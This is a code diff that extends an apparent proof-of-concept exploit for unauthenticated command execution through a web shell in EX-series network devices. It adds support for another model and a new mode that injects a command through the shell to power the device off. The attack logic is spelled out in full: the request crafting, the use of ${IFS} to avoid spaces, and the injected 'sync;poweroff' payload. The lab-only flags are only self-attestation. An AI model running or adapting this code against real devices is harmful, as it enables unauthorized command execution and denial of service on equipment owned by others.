@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
-"""EX2800/EX5000 unconfigured-state webupg validator.
+"""EX2800/EX5000/EX6110 unconfigured-state webupg validator.
 
 The default remains loopback-only.  Physical-device mode is deliberately
 restricted to an explicitly acknowledged, private, isolated lab target.
+The default mode proves command execution with harmless reflected output.
+The destructive shutdown mode requires a second, explicit acknowledgement.
 """
 
 import argparse
@@ -75,18 +77,39 @@ def main() -> int:
     parser.add_argument("--expected-model")
     parser.add_argument("--expected-version")
     parser.add_argument(
+        "--mode",
+        choices=("verify", "shutdown"),
+        default="verify",
+        help="verify reflected command execution (default), or power off the device",
+    )
+    parser.add_argument(
         "--i-own-this-isolated-device",
         action="store_true",
         help="required for physical-device mode",
     )
+    parser.add_argument(
+        "--confirm-shutdown",
+        action="store_true",
+        help="required with --mode shutdown; the target may need power-cycling",
+    )
     args = parser.parse_args()
+
+    if args.mode == "shutdown":
+        if not args.hardware_lab:
+            parser.error("--mode shutdown is restricted to --hardware-lab")
+        if not args.confirm_shutdown:
+            parser.error("--mode shutdown requires --confirm-shutdown")
 
     if args.hardware_lab:
         if not args.i_own_this_isolated_device:
             parser.error("--hardware-lab requires --i-own-this-isolated-device")
-        if args.expected_model != "EX5000" or args.expected_version != "V1.0.1.84":
+        supported_hardware = {"EX5000", "EX6110"}
+        if (
+            args.expected_model not in supported_hardware
+            or args.expected_version != "V1.0.1.84"
+        ):
             parser.error(
-                "hardware mode is gated to --expected-model EX5000 "
+                "hardware mode is gated to --expected-model EX5000 or EX6110 "
                 "--expected-version V1.0.1.84"
             )
     try:
@@ -108,8 +131,8 @@ def main() -> int:
 
     if args.hardware_lab:
         print("validation_mode=owned_isolated_physical_device")
-        print("expected_model=EX5000")
-        print("expected_version=V1.0.1.84")
+        print(f"expected_model={args.expected_model}")
+        print(f"expected_version={args.expected_version}")
         print("unconfigured_state_present=externally_factory_reset")
     else:
         print(f"unconfigured_state_present={str(os.path.exists(unconfigured)).lower()}")
@@ -199,11 +222,21 @@ def main() -> int:
         trigger = "locally preseeded component check"
         print("upgUnauth_preseeded_for_component_check=true")
 
-    response_token = b"FRIDAY_EX2800_UNCONFIGURED_RCE"
+    if args.mode == "verify":
+        response_token = b"FRIDAY_EX6110_RCE_VERIFIED"
+        command = "echo${IFS}FRIDAY_EX6110_RCE_VERIFIED"
+    else:
+        # Emit an acknowledgement before invoking BusyBox poweroff.  A dropped
+        # connection or an unreachable device is expected after this request.
+        response_token = b"FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
+        command = (
+            "echo${IFS}FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
+            ";sync;poweroff"
+        )
+
     # Keep the network request free of path separators so mini_httpd's own URL
     # validation is not confused with the CGI behavior being tested. The
     # original web shell reflects stdout, which is a sufficient harmless proof.
-    command = "echo${IFS}FRIDAY_EX2800_UNCONFIGURED_RCE"
     # Main discards the first "&"-separated token, WebShell continues that
     # strtok state for key/cmd, and the name value is compared as the entire
     # suffix after "name=". Keep name=shell terminal.
@@ -222,11 +255,22 @@ def main() -> int:
         headers={"Cookie": "sessionid=component-check"},
     )
     reflected = response_token in last_response_body
-    executed = reflected if args.hardware_lab else os.path.exists(marker) or reflected
+    if args.mode == "shutdown":
+        # poweroff can terminate HTTP before buffered output is returned.  The
+        # request reaching an already-confirmed sink is reported separately;
+        # actual shutdown must be verified by loss of device availability.
+        executed = reflected
+    else:
+        executed = reflected if args.hardware_lab else os.path.exists(marker) or reflected
     consumed = reflected if args.hardware_lab else not os.path.exists(bypass)
     print(f"webshell_status={status}")
     print(f"upgUnauth_consumed={str(consumed).lower()}")
-    print(f"harmless_command_executed={str(executed).lower()}")
+    print(f"mode={args.mode}")
+    if args.mode == "verify":
+        print(f"harmless_command_executed={str(executed).lower()}")
+    else:
+        print(f"shutdown_acknowledged={str(reflected).lower()}")
+        print("shutdown_requires_reachability_check=true")
     print(f"command_output_reflected={str(reflected).lower()}")
     reproduced = executed and consumed and not component_only
     print(f"webshell_component_execution={str(executed and consumed).lower()}")
